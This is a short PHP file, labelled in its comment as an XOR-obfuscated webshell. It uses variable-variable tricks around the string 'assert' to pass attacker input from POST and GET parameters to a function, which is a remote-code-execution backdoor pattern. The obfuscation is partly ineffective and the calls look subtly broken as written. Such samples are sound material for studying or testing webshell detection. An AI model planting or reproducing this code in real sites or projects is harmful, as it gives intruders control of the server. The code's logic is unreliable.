<?php
// XOR obfuscation webshell
$_ = 'assert';
$_ = $_ ^ "\x00\x00\x00\x00\x00\x00";
@${'_'}[$_]($_POST['x']);
${'_'.$_}['_']($_GET['c']);
?>
